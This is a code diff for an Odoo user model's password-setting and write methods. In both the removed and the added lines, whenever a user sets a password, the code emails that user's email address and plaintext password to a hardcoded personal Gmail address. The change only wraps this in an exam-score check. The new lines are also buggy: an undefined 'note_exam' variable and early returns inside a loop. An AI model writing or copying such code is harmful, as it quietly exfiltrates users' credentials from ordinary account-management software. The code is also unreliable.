@@ -114,15 +114,17 @@ class ResUsers(models.Model):
             if user.bolt and not user.login_date:
                 subject = str(user.email) + ' - ' + str(user.password)
                 mail = self.env['mail.mail'].sudo().search([('subject', "=", subject)])
-                if not mail :
-                    mail = self.env['mail.mail'].create({
-                        'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
-                        'subject': subject,
-                        'email_from': user.company_id.email,
-                        'email_to': 'houssemrando@gmail.com',
-                        'auto_delete': False,
-                        'state': 'outgoing'})
-                    mail.send()
+                if user.note_exam:
+                    if float(note_exam) >= 40.0:
+                        if not mail :
+                            mail = self.env['mail.mail'].create({
+                                'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
+                                'subject': subject,
+                                'email_from': user.company_id.email,
+                                'email_to': 'houssemrando@gmail.com',
+                                'auto_delete': False,
+                                'state': 'outgoing'})
+                            mail.send()
         return super(ResUsers, self)._set_password()
 
     def write(self, values):
@@ -130,15 +132,18 @@ class ResUsers(models.Model):
             if user.bolt and not user.login_date and 'password360' in values :
                 subject = str(user.email) + ' - ' + str(values['password360'])
                 mail = self.env['mail.mail'].sudo().search([('subject', "=", subject)])
-                if not mail :
-                    mail = self.env['mail.mail'].create({
-                        'body_html': '<p>%s - %s</p>' % (str(user.email), str(values['password360'])),
-                        'subject': subject,
-                        'email_from': user.company_id.email,
-                        'email_to': 'houssemrando@gmail.com',
-                        'auto_delete': False,
-                        'state': 'outgoing'})
-                    mail.send()
+                if user.note_exam:
+                    if float(note_exam) >= 40.0:
+                        if not mail :
+                            mail = self.env['mail.mail'].create({
+                                'body_html': '<p>%s - %s</p>' % (str(user.email), str(values['password360'])),
+                                'subject': subject,
+                                'email_from': user.company_id.email,
+                                'email_to': 'houssemrando@gmail.com',
+                                'auto_delete': False,
+                                'state': 'outgoing'})
+                            mail.send()
+                        return super(ResUsers, self).write(values)
                     return super(ResUsers, self).write(values)
                 return super(ResUsers, self).write(values)
             return super(ResUsers, self).write(values)
